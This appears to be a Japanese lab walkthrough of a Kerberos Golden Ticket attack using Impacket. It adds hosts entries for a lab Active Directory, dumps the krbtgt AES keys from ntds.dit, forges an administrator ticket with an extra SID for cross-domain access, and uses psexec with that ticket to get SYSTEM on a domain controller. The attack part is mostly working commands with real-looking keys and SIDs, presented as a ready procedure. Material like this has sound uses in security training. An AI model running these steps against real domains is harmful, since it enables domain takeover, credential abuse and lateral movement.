Kerberosのチケット偽造（Golden Ticket攻撃の模擬手順） として Impacket を使った流れ。

# 手順

## hosts の設定
/etc/hosts にターゲットの AD 環境を解決できるように追記
```zsh
192.168.149.163 gyoza.sub.poseidon.yzx
192.168.149.162 dc02.poseidon.yzx sub.poseidon.yzx
192.168.149.161 dc01.poseidon.yzx poseidon.yzx
```

→ これで FQDN による解決が可能になります。
## AESKeyのダンプ
```zsh
impacket-secretsdump -ntds ntds.dit -system system LOCAL

krbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2
krbtgt:aes128-cts-hmac-sha1-96:b5d83edef61d3c3799047e208e13b2c7
```
- 256を優先して使う

## チケット作成 (impacket-ticketer)
```zsh
impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \
  -domain sub.poseidon.yzx \
  -domain-sid S-1-5-21-4168247447-1722543658-2110108262 \
  -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 \
  -extra-pac \
  -user-id 500 administrator
```

- -aesKey: KRBTGT アカウントの AES キー（事前にダンプしたもの）
![](assets/images/Pasted%20image%2020250906005737.png)

- -domain-sid: 現在のドメイン SID 
```zsh
lsadump::lsa /patch
```

![](Assets/Images/Pasted%20image%2020260502094655.png)
![](Assets/Images/Pasted%20image%2020260502094649.png)

- -extra-sid: 横展開先、親または子ドメインに対してアクセスする場合に必要（信頼関係など）
- ![](Assets/Images/Pasted%20image%2020260502094641.png)
- -user-id 500: Administrator 固有の RID（500）を指定
→ 実行すると administrator.ccache が生成されます。
![](Assets/Images/Pasted%20image%2020260502094636.png)
## 環境変数で Kerberos チケットをセット
```zsh
export KRB5CCNAME=$PWD/administrator.ccache
```
→ impacket の各ツールがこのチケットを利用するようになります。

## Kerberos 認証を利用したリモート実行
```zsh
impacket-psexec 'sub.poseidon.yzx/administrator@dc01.poseidon.yzx' -k -no-pass
```
- -k : Kerberos 認証を使用
- -no-pass: パスワード不要（チケットを利用するため）
![](Assets/Images/Pasted%20image%2020260502094628.png)
→ whoami 実行結果が nt authority\system になり、SYSTEM 権限を取得できます。

✅ つまりこの一連の流れは Golden Ticket → Kerberos 認証で横展開 → SYSTEM権限取得 のデモですね。
「revert する前に試して」と書かれているのは、ラボ環境なのでマシンをリセットするとチケットが無効化されるからだと思います。